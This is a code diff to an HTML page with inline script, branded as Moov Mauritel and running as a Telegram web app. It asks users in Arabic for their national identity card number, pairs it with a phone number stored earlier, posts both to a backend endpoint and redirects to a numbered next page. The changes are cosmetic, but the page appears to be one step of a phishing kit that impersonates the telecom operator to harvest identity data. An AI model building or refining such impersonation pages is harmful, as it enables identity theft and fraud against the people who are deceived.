@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Moov Mauritel - بطاقة الهوية الوطنية (CIN)</title>
+    <title>Moov Mauritel - بطاقة التعريف الوطنية</title>
 
     <!-- ✅ Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -47,7 +47,7 @@
         }
 
         .header-title {
-            font-size: 30px;
+            font-size: 28px;
             font-weight: 900;
             margin: 0;
             display: flex;
@@ -98,7 +98,7 @@
             color: var(--text-muted);
             font-size: 14px;
             margin-bottom: 25px;
-            line-height: 1.5;
+            line-height: 1.6;
             font-weight: 500;
         }
 
@@ -237,20 +237,22 @@
     <div class="header-title">
         <span>Moov Mauritel</span><span class="region">موريتانيا</span>
     </div>
-    <div class="sub-header-text">التحقق من الهوية (CIN)</div>
+    <div class="sub-header-text">بطاقة التعريف الوطنية</div>
 </div>
 
 <!-- Main Content Area -->
 <div class="main-content">
     <h2>بطاقة التعريف الوطنية</h2>
-    <p class="description">يرجى إدخال رقم بطاقة التعريف الوطنية الخاصة بك (Carte d'Identité Nationale - CIN) لإكمال عملية التحقق.</p>
+    <p class="description">
+        يرجى إدخال الرقم الوطني الخاص بـ <strong>بطاقة التعريف الوطنية (Carte d'Identité Nationale - CIN)</strong> لإكمال التوثيق.
+    </p>
 
     <!-- Error Banner -->
     <div id="errorDisplay" class="error-banner"></div>
 
     <!-- National ID Input -->
     <div class="input-group">
-        <label for="cinInput" class="input-label">رقم بطاقة التعريف (CIN):</label>
+        <label for="cinInput" class="input-label">رقم بطاقة التعريف الوطنية (CIN):</label>
         <input 
             type="text" 
             id="cinInput" 
@@ -295,13 +297,12 @@ document.addEventListener("DOMContentLoaded", () => {
         cinInput.classList.add("input-error");
     }
 
-    // Format & validate CIN input (Numbers only, typical 10-digit NNIN in Mauritania)
+    // Format & validate CIN input (Numbers only, 10-digit NNIN format for Mauritania)
     cinInput.addEventListener("input", () => {
         cinInput.value = cinInput.value.replace(/\D/g, "");
         cinInput.classList.remove("input-error");
         errorDisplay.style.display = "none";
 
-        // Enable button if entry meets minimum standard length (e.g., 10 digits)
         const isValid = cinInput.value.length >= 8 && cinInput.value.length <= 10;
         submitBtn.disabled = !isValid;
         submitBtn.classList.toggle("active", isValid);
@@ -314,14 +315,12 @@ document.addEventListener("DOMContentLoaded", () => {
         const cinValue = cinInput.value.trim();
         const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
 
-        // Store CIN to local storage
         localStorage.setItem("userCIN", cinValue);
 
         submitBtn.disabled = true;
         submitBtn.classList.remove("active");
         submitBtn.textContent = "جاري الإرسال...";
 
-        // Optionally notify backend endpoint
         try {
             await fetch("/api/save-cin", {
                 method: "POST",
@@ -332,7 +331,6 @@ document.addEventListener("DOMContentLoaded", () => {
             console.error("❌ خطأ أثناء حفظ الرقم الوطني:", err);
         }
 
-        // Redirect to page9
         window.location.href = "/page9";
     });
 });
